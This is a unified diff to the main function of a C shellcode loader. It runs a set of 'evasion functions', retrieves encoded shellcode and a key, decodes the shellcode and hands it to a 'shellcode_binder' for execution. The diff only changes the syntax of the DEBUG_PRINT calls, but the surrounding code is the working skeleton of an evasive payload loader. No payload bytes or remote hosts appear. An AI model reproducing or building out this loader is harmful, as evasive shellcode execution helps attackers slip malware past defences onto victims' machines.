@@ -79,12 +79,12 @@ int main (int argc, char **argv)
 			
 	// Execute evasion functions
 	if(evasion_functions[0] == NULL) {
-		DEBUG_PRINT(("No evasion techniques applied.\n"));
+		DEBUG_PRINT("No evasion techniques applied.\n");
 	}	
 	
 	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
 		if(evasion_functions[i] != NULL) {	
-			DEBUG_PRINT(("Executing evasion function %d.\n", i));
+			DEBUG_PRINT("Executing evasion function %d.\n", i);
 			evasion_functions[i]("");
 		}
 	}	
@@ -98,13 +98,13 @@ int main (int argc, char **argv)
 	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
 	#endif
 	if(encoded_shellcode != NULL) {
-		DEBUG_PRINT(("Retrieved shellcode data, size is %d bytes.\n", shellcode_size));
+		DEBUG_PRINT("Retrieved shellcode data, size is %d bytes.\n", shellcode_size);
 		for(int i = 0; i < shellcode_size; i++) {
-			DEBUG_PRINT(("%02x ", encoded_shellcode[i]));
+			DEBUG_PRINT("%02x ", encoded_shellcode[i]);
 		}
-		DEBUG_PRINT(("\n\n"));
+		DEBUG_PRINT("\n\n");
 	} else {
-		DEBUG_PRINT(("No shellcode retrieved.\n"));
+		DEBUG_PRINT("No shellcode retrieved.\n");
 	}
 	
 	// Retrieve crypto key
@@ -116,29 +116,29 @@ int main (int argc, char **argv)
 	unsigned char *key = get_key(argv[2], &key_length);
 	#endif
 	if(key != NULL) {
-		DEBUG_PRINT(("Retrieved key data, key length is %d bytes.\n", key_length));
+		DEBUG_PRINT("Retrieved key data, key length is %d bytes.\n", key_length);
 		for(int i = 0; i < key_length; i++) {
-			DEBUG_PRINT(("%02x ", key[i]));
+			DEBUG_PRINT("%02x ", key[i]);
 		}
-		DEBUG_PRINT(("\n\n"));
+		DEBUG_PRINT("\n\n");
 	} else {
-		DEBUG_PRINT(("No key retrieved.\n"));
+		DEBUG_PRINT("No key retrieved.\n");
 	}
 		
 	// Decode shellcode
 	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
-	DEBUG_PRINT(("Calling decode_shellcode...\n"));
+	DEBUG_PRINT("Calling decode_shellcode...\n");
 	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
-	DEBUG_PRINT(("Decoded shellcode: \n"));	
+	DEBUG_PRINT("Decoded shellcode: \n");	
 	for(int i = 0; i < shellcode_size; i++) {
-		DEBUG_PRINT(("%02x ", shellcode[i]));
+		DEBUG_PRINT("%02x ", shellcode[i]);
 	}
-	DEBUG_PRINT(("\n\n"));
+	DEBUG_PRINT("\n\n");
 	
 	// Bind and execute shellcode
-	DEBUG_PRINT(("Calling shellcode_binder...\n"));
+	DEBUG_PRINT("Calling shellcode_binder...\n");
 	shellcode_binder(shellcode);
 	
-	DEBUG_PRINT(("Execution finished.\n"));
+	DEBUG_PRINT("Execution finished.\n");
 	return 0;
 }
